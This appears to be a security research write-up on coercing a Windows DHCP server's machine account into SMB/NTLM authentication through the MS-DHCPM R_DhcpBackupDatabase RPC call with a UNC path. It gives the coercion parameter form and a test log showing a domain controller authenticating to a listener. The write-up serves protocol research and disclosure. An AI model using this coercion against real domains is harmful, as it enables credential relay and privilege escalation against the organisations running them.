# MS-DHCPM - Remote call to R_DhcpBackupDatabase (opnum 44)

## Summary

+ **Protocol**: [[MS-DHCPM]: Microsoft Dynamic Host Configuration Protocol (DHCP) Server Management Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dhcpm/d117857c-1491-46a2-a68e-c844be3627d4)

+ **Protocol UUID**: 5b821720-f63b-11d0-aad2-00c04fc324db (the **`dhcpsrv2`** interface)

+ **Protocol version**: 1.0

+ **Transport**: `ncacn_ip_tcp` (dynamic port via the endpoint mapper). On the tested Windows Server 2025 DC the `\PIPE\DHCPSERVER` named pipe was not present; the DHCP RPC interfaces were reachable only over `ncacn_ip_tcp`.

> **Interface correction (verified by testing).** `R_DhcpBackupDatabase` (opnum 44) belongs to the
> **`dhcpsrv2`** interface `5b821720-f63b-11d0-aad2-00c04fc324db`, **not** the `dhcpsrv` interface
> `6bffd098-a112-3610-9833-46c3f874532d` originally listed here. Opnum 44 of `dhcpsrv` is a different
> method (`R_DhcpCreateClientInfoVQ`); calling it with the backup parameters faults with
> `nca_s_fault_ndr`. Both interfaces are served by the DHCP service on the same endpoint.

+ **Function name**: [`R_DhcpBackupDatabase`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dhcpm/f2b03c0f-218d-47dd-87f4-c1be817b366b)

+ **Function operation number**: `44`

+ **Authenticated**: Yes (DHCP Administrators)

## Description

`R_DhcpBackupDatabase` backs up the DHCP configuration, settings, and lease records to a
caller-specified path. It is a candidate coercion primitive because the server creates the
destination directory and writes to it, and the specification defines **no UNC or traversal
validation** on the `Path` parameter — a UNC `Path` would make the DHCP server (running as the
machine account) reach out to it.

Per [MS-DHCPM] 3.2.4.45, the server processing is:

> - Validate if this method is authorized for read/write access per section 3.5.5. If not, return the error ERROR_ACCESS_DENIED.
> - If the *Path* is NULL, return ERROR_INVALID_PARAMETER.
> - If the *Path* is not a valid string, return ERROR_INVALID_NAME.
> - **Create the directory for the value specified in *Path*, and back up the information stored in all the ADM elements in that directory.**

The only checks are non-NULL and "valid string"; there is no restriction against a UNC path, and
the write happens immediately (no service restart), which is what makes this attractive.

### Conditions

+ **Privilege**: read/write authorization on the DHCP server ([MS-DHCPM] 3.5.5) — i.e. membership of **DHCP Administrators** (or local Administrators). Not a low-privilege primitive.
+ **Prerequisite calls**: none. `ServerIpAddress` is an unused binding handle; the call is self-contained.
+ **Trigger**: immediate — the server performs `CreateDirectory(Path)` and writes the backup during the call.
+ **Coerced parameter**: `Path` (LPWSTR). Expected coercion form: `\\<listener>\share\subdir`.

## Function technical detail

```cpp
DWORD R_DhcpBackupDatabase(
   [in, unique, string] DHCP_SRV_HANDLE ServerIpAddress,
   [in, string] LPWSTR Path
 );
```

+ **ServerIpAddress**: binding handle; the server ignores it.
+ **Path**: LPWSTR path where the backup is written. Only checked for non-NULL and validity; no UNC/traversal restriction in the spec.

## Testing status — CONFIRMED

**Confirmed coercion on Windows Server 2025** (domain controller with the DHCP Server role
installed), 2026-09-12. Bound the `dhcpsrv2` interface (`5b821720-…`) over `ncacn_ip_tcp` (EPM),
authenticated as an administrator, listener on the UNC path:

```
R_DhcpBackupDatabase(ServerIpAddress=NULL, Path="\\<listener>\share\dhcpbak")   [dhcpsrv2 opnum 44]
  -> ERROR_ACCESS_DENIED
  -> listener: Incoming connection; TMP-W-2025-DC1$ authenticated successfully
```

The DHCP server (machine account) connected to the listener and authenticated **immediately** during
the call. `ERROR_ACCESS_DENIED` is the expected tail — the machine account cannot actually write the
backup into the attacker's share, but the outbound authentication (the coercion) has already
happened. Requires DHCP Administrators (read/write authorization). As predicted from the spec, there
is no UNC validation on `Path`.

## Related work

The **DHCP Administrators** group as a privilege-escalation surface was researched by **Ori David
(Akamai Security)**: "Abusing the DHCP Administrators Group for Privilege Escalation in Windows
Domains" (2024) and the [DDSpoof](https://github.com/akamai/DDSpoof) tool. That work coerces the
DHCP server's machine account through **DHCP DNS dynamic updates** (Kerberos-over-DNS / TKEY),
typically relayed to AD CS (ESC8) — a different protocol surface from the one used here.

`R_DhcpBackupDatabase` is a **distinct primitive within the same abused group**: it drives the
MS-DHCPM management RPC directly, creating/writing the backup directory at a caller-supplied `Path`
with no UNC validation, which coerces an **SMB/NTLM** authentication from the same machine account.
Same group and same target account, different call and different channel (SMB vs Kerberos-over-DNS).

## References

+ Documentation of protocol [MS-DHCPM]: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dhcpm/d117857c-1491-46a2-a68e-c844be3627d4

+ Documentation of function `R_DhcpBackupDatabase` (opnum 44): https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dhcpm/f2b03c0f-218d-47dd-87f4-c1be817b366b
